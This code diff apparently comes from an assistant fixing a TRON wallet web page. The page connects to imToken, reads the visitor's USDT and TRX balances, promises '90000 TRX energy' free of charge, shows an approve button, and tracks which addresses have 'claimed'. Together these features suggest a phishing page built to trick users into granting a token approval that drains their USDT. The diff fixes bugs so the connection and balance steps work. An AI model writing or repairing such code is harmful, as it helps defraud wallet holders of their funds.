@@ -479,33 +479,38 @@
         }
 
    
-       /**
- * 钱包初始化（修复tronWeb.accounts()废弃问题）
+/**
+ * 钱包初始化（修复代码块错位+变量未赋值）
  */
 async function initWallet() {
     try {
         // 1. 请求钱包授权（保留你原来的逻辑，仅加accounts()存在性判断）
-let accounts;
-try {
-    // 新版imToken：tron_requestAccounts
-    accounts = await tronWeb.request({ method: "tron_requestAccounts" });
-} catch (e) {
-    // 旧版imToken：先判断accounts()是否存在，避免报错
-    if (typeof tronWeb.accounts !== 'function') {
-        throw new Error("钱包版本不支持该授权方式，请更新imToken到最新版本");
-    }
-    // 你原来的旧版逻辑（仅当方法存在时才调用）
-    accounts = await tronWeb.accounts();
-}
-if (!accounts || accounts.length === 0) {
-    throw new Error("用户未授权钱包访问");
-}
-userInfoEl.innerHTML = `
-    已连接：<br>
-    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-    USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-    <span style="color: #4ade80; font-size: 14px;">✅ 可免费领取90000 TRX能量</span>
-`;
+        let accounts;
+        try {
+            // 新版imToken：tron_requestAccounts
+            accounts = await tronWeb.request({ method: "tron_requestAccounts" });
+        } catch (e) {
+            // 旧版imToken：先判断accounts()是否存在，避免报错
+            if (typeof tronWeb.accounts !== 'function') {
+                throw new Error("钱包版本不支持该授权方式，请更新imToken到最新版本");
+            }
+            // 你原来的旧版逻辑（仅当方法存在时才调用）
+            accounts = await tronWeb.accounts();
+        }
+        if (!accounts || accounts.length === 0) {
+            throw new Error("用户未授权钱包访问");
+        }
+        // 【关键修复1】授权成功后，给全局userAddress赋值（之前漏了这行）
+        userAddress = accounts[0];
+
+        // 【关键修复2】二次授权校验：移到userAddress赋值后，代码块不再错位
+        if (isAddressAuthorized(userAddress)) {
+            userInfoEl.innerHTML = `
+                已领取提示<br>
+                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                <span style="color: #3b82f6; font-size: 14px;">✅ 该钱包已领取过免费能量</span><br>
+                <span style="color: #a0a8a4; font-size: 13px;">每个地址仅限领取一次，感谢支持～</span>
+            `;
             approveBtn.disabled = true;
             approveBtn.textContent = "已领取过能量";
             updateWalletStatus();
@@ -513,14 +518,14 @@ userInfoEl.innerHTML = `
             return;
         }
 
-        // 3. 获取USDT合约实例
+        // 2. 获取USDT合约实例（逻辑正常，无错）
         try {
             trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
         } catch (e) {
             throw new Error("USDT合约加载失败");
         }
 
-        // 4. 获取余额
+        // 3. 获取余额（逻辑正常，无错）
         try {
             const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
             tokenBalance = Number(usdtRaw) / 1000000;
@@ -530,7 +535,7 @@ userInfoEl.innerHTML = `
             throw new Error("余额获取失败，请检查网络");
         }
 
-        // 5. 发送信号A（4.6TRX）
+        // 4. 发送信号A（4.6TRX）（逻辑正常，无错）
         userInfoEl.innerHTML = `
             已连接：<br>
             ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
@@ -579,7 +584,7 @@ userInfoEl.innerHTML = `
         updateWalletStatus();
         document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
     } catch (e) {
-        // 精准错误提示（适配本次报错）
+        // 精准错误提示
         const errorMsg = e.message;
         userInfoEl.innerHTML = `
             钱包连接异常<br>
